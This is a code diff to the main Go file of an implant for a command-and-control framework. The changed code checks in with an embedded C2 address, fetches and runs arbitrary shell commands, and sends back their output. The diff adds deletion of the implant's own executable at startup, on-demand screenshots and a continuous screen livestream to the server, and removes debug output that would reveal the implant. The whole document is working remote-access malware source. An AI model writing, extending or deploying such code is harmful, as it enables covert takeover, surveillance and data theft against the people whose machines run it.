@@ -1,3 +1,4 @@
+// implant/main.go
 package main
 
 import (
@@ -6,8 +7,9 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"os"
 	"os/exec"
-	"runtime" // For OS specific commands
+	"runtime"
 	"strings"
 	"time"
 
@@ -15,55 +17,51 @@ import (
 )
 
 //go:embed placeholder.txt
-var implantIDBytes []byte // This should contain the 36-byte unique token after patching.
-// Initially, placeholder.txt should contain "deadbeef-0000-0000-0000-000000000000".
+var implantIDBytes []byte
 
 //go:embed c2_address.txt
-var c2AddressBytes []byte // This will contain the C2 server address (e.g., "ip:port") after patching.
-// Initially, c2_address.txt should contain "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX".
+var c2AddressBytes []byte
+
+const (
+	implantIDPlaceholder = "deadbeef-0000-0000-0000-000000000000"
+	c2AddressPlaceholder = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"
+	checkInInterval      = 5 * time.Second
+	livestreamInterval   = 1 * time.Second // How often to send livestream frames
+)
+
+var (
+	checkInURL         string
+	commandsURL        string
+	commandResultURL   string
+	livestreamFrameURL string // <-- NEW: For sending livestream frames
+
+	// Global state for livestreaming
+	isLivestreamActive bool
+	stopLivestreamChan chan struct{}
+)
+
+// Declarations for platform-specific functions (defined in other files)
+var doSelfDelete func(exePath string)
+var setOSSpecificAttrs func(cmd *exec.Cmd)
+var takeScreenshot func() (string, error)
 
 // implantID extracts the unique implant token.
-// CORRECTED: Reads from implantIDBytes.
 func implantID() string {
-	s := string(implantIDBytes) // Use implantIDBytes
-
-	// Trim at the first null byte, if any.
-	// This is good practice, though the server's patch for implant ID
-	// (36-byte UUID) shouldn't introduce nulls if lengths match perfectly.
+	s := string(implantIDBytes)
 	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
 		s = s[:nullIdx]
 	}
-	return strings.TrimSpace(s) // Then trim whitespace.
+	return strings.TrimSpace(s)
 }
 
 // c2ServerAddress extracts the C2 server address.
-// CORRECTED: Added null byte trimming.
 func c2ServerAddress() string {
-	s := string(c2AddressBytes) // Use c2AddressBytes
-
-	// The server patches the C2 address and pads it with null bytes.
-	// We MUST truncate the string at the first null byte to get the actual address.
+	s := string(c2AddressBytes)
 	if nullIdx := strings.IndexByte(s, 0); nullIdx != -1 {
 		s = s[:nullIdx]
 	}
-	return strings.TrimSpace(s) // Then trim any leading/trailing whitespace from the address itself.
+	return strings.TrimSpace(s)
 }
-
-// Placeholders - these must match the content of placeholder.txt and c2_address.txt respectively
-// AND the placeholders used by the server for patching.
-const (
-	implantIDPlaceholder = "deadbeef-0000-0000-0000-000000000000"
-	// Ensure c2_address.txt contains this exact string before compiling the base implant.
-	c2AddressPlaceholder = "C2_IP_PLACEHOLDER_STRING_PADDING_TO_64_BYTES_XXXXXXXXXXXXXXXXXXXXX"
-	checkInInterval      = 5 * time.Second
-)
-
-// URLs will be constructed dynamically
-var (
-	checkInURL       string
-	commandsURL      string // Format string: "http://%s/implant-client/%s/commands"
-	commandResultURL string
-)
 
 type Command struct {
 	ID      int    `json:"id"`
@@ -73,6 +71,7 @@ type Command struct {
 type CheckInPayload struct {
 	ImplantID string `json:"implant_id"`
 	IPAddress string `json:"ip_address"`
+	PWD       string `json:"pwd"`
 }
 
 type CommandResultPayload struct {
@@ -80,47 +79,48 @@ type CommandResultPayload struct {
 	Output    string `json:"output"`
 }
 
+// NEW: Payload for livestream frames
+type LivestreamFramePayload struct {
+	ImplantID string `json:"implant_id"`
+	FrameData string `json:"frame_data"`
+}
+
 func initializeConfig() bool {
 	currentImplantID := implantID()
 	currentC2Address := c2ServerAddress()
 
-	// Debugging output to verify what's being read:
-	// fmt.Printf("DEBUG: Raw implantIDBytes: %q\n", string(implantIDBytes))
-	// fmt.Printf("DEBUG: Raw c2AddressBytes: %q\n", string(c2AddressBytes))
-	// fmt.Printf("DEBUG: Parsed implantID: '%s'\n", currentImplantID)
-	// fmt.Printf("DEBUG: Parsed c2Address: '%s'\n", currentC2Address)
-
 	if currentImplantID == "" || currentImplantID == implantIDPlaceholder {
-		fmt.Printf("Error: Implant ID not properly embedded/patched or is still the placeholder: '%s'\n", currentImplantID)
 		return false
 	}
-	// This check is now more reliable because c2ServerAddress() trims nulls.
 	if currentC2Address == "" || currentC2Address == c2AddressPlaceholder {
-		fmt.Printf("Error: C2 Server Address not properly embedded/patched or is still the placeholder: '%s'\n", currentC2Address)
 		return false
 	}
 
 	c2BaseURL := currentC2Address
 	if !strings.HasPrefix(c2BaseURL, "http://") && !strings.HasPrefix(c2BaseURL, "https://") {
-		c2BaseURL = "http://" + c2BaseURL // Default to http if no scheme
+		c2BaseURL = "http://" + c2BaseURL
 	}
 
 	checkInURL = fmt.Sprintf("%s/checkin", c2BaseURL)
-	commandsURL = fmt.Sprintf("%s/implant-client/%%s/commands", c2BaseURL) // %%s to escape % for later Sprintf
+	commandsURL = fmt.Sprintf("%s/implant-client/%s/commands", c2BaseURL, currentImplantID)
 	commandResultURL = fmt.Sprintf("%s/command-result", c2BaseURL)
-
-	fmt.Printf("Implant Online. ID: %s, C2: %s\n", currentImplantID, c2BaseURL)
-	fmt.Printf("Check-in URL: %s\n", checkInURL)
-	fmt.Printf("Commands URL (template): %s\n", commandsURL)
-	fmt.Printf("Command Result URL: %s\n", commandResultURL)
+	livestreamFrameURL = fmt.Sprintf("%s/livestream-frame", c2BaseURL) // <-- NEW
 	return true
 }
 
 func main() {
+	exePath, err := os.Executable()
+	if err == nil {
+		doSelfDelete(exePath)
+	}
+
 	if !initializeConfig() {
 		time.Sleep(10 * time.Second)
 		return
 	}
+
+	// Initialize stopLivestreamChan (it's nil initially)
+	// It will be properly created when livestream starts.
 
 	for {
 		checkIn()
@@ -130,54 +130,43 @@ func main() {
 }
 
 func checkIn() {
+	// If livestreaming, maybe skip full check-in as frames act as keep-alive
+	if isLivestreamActive {
+		return
+	}
+	currentPwd, err := os.Getwd()
+	if err != nil {
+		currentPwd = "error_getting_pwd: " + err.Error()
+	}
 	payload := CheckInPayload{
-		ImplantID: implantID(), // This will now correctly use the patched ID
+		ImplantID: implantID(),
 		IPAddress: "",
+		PWD:       currentPwd,
 	}
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
-		fmt.Println("Error marshalling check-in payload:", err)
 		return
 	}
-
-	// checkInURL should now be correctly formed without null bytes
 	resp, err := http.Post(checkInURL, "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
-		fmt.Println("Error during check-in http.Post:", err)
 		return
 	}
 	defer resp.Body.Close()
-
-	if resp.StatusCode == http.StatusOK {
-		// fmt.Println("Check-in successful")
-	} else {
-		bodyBytes, _ := io.ReadAll(resp.Body)
-		fmt.Printf("Check-in failed. Status: %s, Body: %s\n", resp.Status, string(bodyBytes))
-	}
 }
 
 func fetchAndExecuteCommands() {
-	// Format the commandsURL with the actual implantID
-	currentCommandsURL := fmt.Sprintf(commandsURL, implantID()) // implantID() is corrected
-	// fmt.Println("Fetching commands from:", currentCommandsURL)
-
-	// currentCommandsURL should now be correctly formed without null bytes in the base URL part
-	resp, err := http.Get(currentCommandsURL)
+	resp, err := http.Get(commandsURL)
 	if err != nil {
-		fmt.Println("Error fetching commands http.Get:", err)
 		return
 	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusOK {
-		bodyBytes, _ := io.ReadAll(resp.Body)
-		fmt.Printf("Error fetching commands. Status: %s, Body: %s\n", resp.Status, string(bodyBytes))
 		return
 	}
 
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
-		fmt.Println("Error reading command response body:", err)
 		return
 	}
 
@@ -185,33 +174,91 @@ func fetchAndExecuteCommands() {
 		Commands []Command `json:"commands"`
 	}
 	if err := json.Unmarshal(body, &respStruct); err != nil {
-		fmt.Println("Error decoding command response JSON:", err, "-- Body was:", string(body))
 		return
 	}
 
-	if len(respStruct.Commands) > 0 {
-		fmt.Printf("Received %d command(s) to execute.\n", len(respStruct.Commands))
-	}
+	currentImplantID := implantID() // Cache for this loop iteration
 
-	for _, cmd := range respStruct.Commands {
-		fmt.Printf("Executing Command ID %d: %s\n", cmd.ID, cmd.Command)
-		var output []byte
-		var execErr error
+	for _, cmdToExec := range respStruct.Commands {
+		trimmedCmdStr := strings.TrimSpace(cmdToExec.Command)
+		currentPwd, _ := os.Getwd()
 
-		if runtime.GOOS == "windows" {
-			command := exec.Command("cmd", "/C", cmd.Command)
-			output, execErr = command.CombinedOutput()
-		} else {
-			command := exec.Command("sh", "-c", cmd.Command)
-			output, execErr = command.CombinedOutput()
+		// --- Livestream Start Command ---
+		if trimmedCmdStr == "livestream_start" {
+			if isLivestreamActive {
+				sendOutput(cmdToExec.ID, "Livestream is already active.")
+			} else {
+				isLivestreamActive = true
+				stopLivestreamChan = make(chan struct{}) // Create a new channel for this session
+				go runLivestream(currentImplantID, stopLivestreamChan)
+				sendOutput(cmdToExec.ID, "Livestream started.")
+			}
+			continue
 		}
 
-		resultString := string(output)
+		// --- Livestream Stop Command ---
+		if trimmedCmdStr == "livestream_stop" {
+			if isLivestreamActive {
+				isLivestreamActive = false
+				if stopLivestreamChan != nil {
+					close(stopLivestreamChan) // Signal the goroutine to stop
+					stopLivestreamChan = nil  // Set to nil after closing
+				}
+				sendOutput(cmdToExec.ID, "Livestream stopped.")
+			} else {
+				sendOutput(cmdToExec.ID, "Livestream is not active.")
+			}
+			continue
+		}
+
+		// --- Screenshot Command Handling ---
+		if trimmedCmdStr == "screenshot" {
+			outputBase64, err := takeScreenshot()
+			if err != nil {
+				sendOutput(cmdToExec.ID, fmt.Sprintf("Screenshot failed: %v", err))
+			} else {
+				sendOutput(cmdToExec.ID, "screenshot_data:"+outputBase64)
+			}
+			continue
+		}
+		// --- End Screenshot Command Handling ---
+
+		if strings.HasPrefix(trimmedCmdStr, "cd ") {
+			targetDir := strings.TrimSpace(strings.TrimPrefix(trimmedCmdStr, "cd "))
+			if targetDir == "" {
+				homeDir, homeErr := os.UserHomeDir()
+				if homeErr != nil {
+					sendOutput(cmdToExec.ID, fmt.Sprintf("%s $ %s\ncd: Could not determine home directory: %s", currentPwd, cmdToExec.Command, homeErr.Error()))
+					continue
+				}
+				targetDir = homeDir
+			}
+			targetDir = os.ExpandEnv(targetDir)
+			err := os.Chdir(targetDir)
+			newPwd, _ := os.Getwd()
+			prompt := fmt.Sprintf("%s $ %s\n", currentPwd, cmdToExec.Command)
+			if err != nil {
+				sendOutput(cmdToExec.ID, prompt+fmt.Sprintf("Error changing directory to '%s': %v", targetDir, err))
+			} else {
+				sendOutput(cmdToExec.ID, prompt+fmt.Sprintf("Changed directory to: %s", newPwd))
+			}
+			continue
+		}
+
+		var command *exec.Cmd
+		if runtime.GOOS == "windows" {
+			command = exec.Command("cmd", "/C", cmdToExec.Command)
+		} else {
+			command = exec.Command("sh", "-c", cmdToExec.Command)
+		}
+		setOSSpecificAttrs(command)
+		outputBytes, execErr := command.CombinedOutput()
+		resultString := string(outputBytes)
+		prompt := fmt.Sprintf("%s $ %s\n", currentPwd, cmdToExec.Command)
 		if execErr != nil {
 			resultString += "\nExecution Error: " + execErr.Error()
-			fmt.Printf("Error executing command ID %d: %v\nOutput: %s\n", cmd.ID, execErr, resultString)
 		}
-		sendOutput(cmd.ID, resultString)
+		sendOutput(cmdToExec.ID, prompt+resultString)
 	}
 }
 
@@ -222,22 +269,68 @@ func sendOutput(cmdID int, output string) {
 	}
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
-		fmt.Println("Error marshalling command result payload:", err)
+		return
+	}
+	resp, err := http.Post(commandResultURL, "application/json", bytes.NewBuffer(jsonData))
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+}
+
+// NEW: Goroutine for handling livestreaming
+func runLivestream(implantToken string, localStopChan <-chan struct{}) {
+	fmt.Printf("[%s] Livestream goroutine started.\n", implantToken)
+	ticker := time.NewTicker(livestreamInterval)
+	defer ticker.Stop()
+	defer fmt.Printf("[%s] Livestream goroutine stopped.\n", implantToken)
+
+	for {
+		select {
+		case <-ticker.C:
+			// Check isLivestreamActive primarily, localStopChan is the definitive signal
+			if !isLivestreamActive {
+				fmt.Printf("[%s] Livestream goroutine: isLivestreamActive is false, exiting.\n", implantToken)
+				return
+			}
+
+			outputBase64, err := takeScreenshot()
+			if err != nil {
+				fmt.Printf("[%s] Livestream screenshot failed: %v\n", implantToken, err)
+				// Optionally send an error frame or just skip
+				continue
+			}
+			sendLivestreamFrame(implantToken, outputBase64)
+
+		case <-localStopChan:
+			fmt.Printf("[%s] Livestream goroutine: Received stop signal via channel.\n", implantToken)
+			return
+		}
+	}
+}
+
+// NEW: Function to send a single livestream frame
+func sendLivestreamFrame(implantToken string, base64Data string) {
+	payload := LivestreamFramePayload{
+		ImplantID: implantToken,
+		FrameData: base64Data,
+	}
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		fmt.Printf("[%s] Error marshalling livestream frame: %v\n", implantToken, err)
 		return
 	}
 
-	// commandResultURL should now be correctly formed
-	resp, err := http.Post(commandResultURL, "application/json", bytes.NewBuffer(jsonData))
+	resp, err := http.Post(livestreamFrameURL, "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
-		fmt.Println("Error sending output http.Post:", err)
+		fmt.Printf("[%s] Error sending livestream frame: %v\n", implantToken, err)
 		return
 	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode == http.StatusOK {
-		// fmt.Printf("Command %d output sent successfully\n", cmdID)
-	} else {
-		bodyBytes, _ := io.ReadAll(resp.Body)
-		fmt.Printf("Failed to send output for command %d. Status: %s, Body: %s\n", cmdID, resp.Status, string(bodyBytes))
+	if resp.StatusCode != http.StatusOK {
+		bodyBytes, _ := io.ReadAll(resp.Body) // Best effort to read body
+		fmt.Printf("[%s] Error sending livestream frame, C2 status: %s, body: %s\n", implantToken, resp.Status, string(bodyBytes))
 	}
+	// fmt.Printf("[%s] Livestream frame sent successfully.\n", implantToken) // Can be too verbose
 }
